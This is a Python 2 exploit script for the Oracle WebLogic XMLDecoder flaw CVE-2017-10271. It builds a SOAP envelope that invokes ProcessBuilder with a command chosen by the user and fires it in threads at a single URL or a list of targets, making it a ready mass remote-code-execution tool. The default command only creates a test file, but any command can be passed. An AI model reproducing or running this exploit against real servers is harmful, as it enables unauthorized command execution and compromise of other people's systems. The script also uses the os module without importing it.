#!/usr/bin/env python
#coding:utf-8

import requests
import argparse
import threading


targetList = [
    
]

headers = {}
headers["Content-Type"] = "text/xml"
html_escape_table = {
    "&": "&amp;",
    '"': "&quot;",
    "'": "&apos;",
    ">": "&gt;",
    "<": "&lt;",
}
poc1 = '''
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
<soapenv:Header>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="'''

poc3 = '''
</array>
<void method="start" />
</void>
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body>
</soapenv:Body>
</soapenv:Envelope>
'''
threadList = []
threadNum = 10
timeout = 3


def _execute(url,poc):
    targeturl = url +  "/wls-wsat/CoordinatorPortType"
    try:
        result = requests.post(targeturl, data = poc,headers = headers,timeout=timeout)
        if str(result.status_code) == '500' and 'faultstring' in  result.text and 'faultcode' in result.text:
            print '[+] '+ str(result.status_code)+ '  ' + url +  "\r\n",
        else:
            print '[-] '+ str(result.status_code)+ '  ' + url + "\r\n",
        # print result.text
    except:
        print '[!]  0   ' + 'Time out: '+ url + "\r\n",

def execute(threadId,poc):
    for i in xrange(threadId,len(targetList),threadNum):
        dic = _execute(targetList[i],poc)
        
def scan(command):
    poc2 = ''
    commands = command.split()
    for i in xrange(0,len(commands)):
        poc2 += '<void index="' + str(i) + '"><string>' +"".join(html_escape_table.get(c, c) for c in commands[i]) + '</string></void>'
    poc = poc1 + str(len(commands)) + '">' + poc2 + poc3
    # print poc
    print "[.] Run start: Total " + str(len(targetList)) + " request!"+ "\r\n",
    print '[.] Please check result by ping, nslookup and so on. '+ "\r\n\r\n",
    for threadId in xrange(0,threadNum):
        t = threading.Thread(target=execute,args=(threadId,poc,))
        t.start()
        threadList.append(t)
    for num in xrange(0,threadNum):
        threadList[num].join()
    print "\r\n[.] Run over!"+ "\r\n",
    print '[.] Please check result by ping, nslookup and so on. '+ "\r\n",

def argSet(parser):
    parser.add_argument("-c", "--command", type=str, help="The command e.g. /usr/bin/touch test", default="/usr/bin/touch   test_cve_2017_10271")
    parser.add_argument("-u", "--url", type=str, help="The target url e.g. http://192.168.111.1:7001", default=None)
    parser.add_argument("-f", "--file",type=str, help="Load ip dictionary e.g. url.txt", default=None)
    return parser


def handle(args):
    target = args.url
    if target!=None:
        targetList.append(target)
    filepath = args.file
    if filepath != None:
        if os.path.isfile(filepath):
            with open(filepath, 'r') as f:
                for line in f.readlines():
                    myline = line.strip('\r').strip('\n')
                    targetList.append(myline)
        else:
            print "The path is not exist!"
    command = args.command
    if command ==None:
        command = '/usr/bin/touch test_cve_2017_10271'
    scan(command)


if __name__=='__main__':
    parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter)
    parser = argSet(parser)
    args = parser.parse_args()
    handle(args)




